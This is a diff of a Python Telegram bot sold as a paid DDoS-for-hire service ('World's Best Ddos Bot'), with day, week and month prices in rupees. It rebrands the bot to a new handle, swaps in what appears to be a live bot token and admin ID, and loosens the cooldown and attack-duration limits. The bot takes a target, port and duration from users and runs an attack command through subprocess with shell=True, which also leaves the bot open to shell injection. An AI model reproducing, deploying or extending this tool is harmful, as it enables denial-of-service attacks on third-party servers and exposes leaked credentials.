@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-#@CRACKWARS_DANGER
+#@Moral_PlayzZz_YT
 
 import telebot
 import subprocess
@@ -8,10 +8,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('6985771977:AAHs45lBA9nZ93YsOjhr0LPxjsb6UMctdsg')
+bot = telebot.TeleBot('7264079959:AAGOrJFm8fiFvR82CMl089R2rQ43e42jMX8')
 
 # Admin user IDs
-admin_id = ["6159360725"]
+admin_id = ["1860688107"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -208,7 +208,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n@CRACKWARS_DANGER"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n@Moral_PlayzZz_YT"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -224,8 +224,8 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 60:
+                response = "You Are On Cooldown. Please Wait 1min Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -236,8 +236,8 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 5000:
-                response = "Error: Time interval must be less than 80."
+            if time > 500:
+                response = "Error: Time interval must be less than 500."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
@@ -246,9 +246,9 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\n@CRACKWARS_DANGER"  # Updated command syntax
+            response = "Usage :- /bgmi <target> <port> <time>\n@Moral_PlayzZz_YT "# Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\n@CRACKWARS_DANGER"
+        response = "You Are Not Authorized To Use This Command.\n@Moral_PlayzZz_YT"
 
     bot.reply_to(message, response)
 
@@ -285,7 +285,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- @CRACKWARS_DANGER
+ @Moral_PlayzZz_YT
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -300,7 +300,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\n@CRACKWARS_DANGER"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\n@Moral_PlayzZz_YT"
     bot.reply_to(message, response)
 
 
@@ -329,7 +329,7 @@ Pr-ice List:
 Day-->150 Rs
 Week-->900 Rs
 Month-->1600 Rs
-@CRACKWARS_DANGER
+@Moral_PlayzZz_YT
 '''
     bot.reply_to(message, response)
 
@@ -344,7 +344,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-@CRACKWARS_DANGER
+@Moral_PlayzZz_YT
 '''
     bot.reply_to(message, response)
 
@@ -375,4 +375,4 @@ def broadcast_message(message):
 
 
 bot.polling()
-#@CRACKWARS_DANGER
+#@Moral_PlayzZz_YT
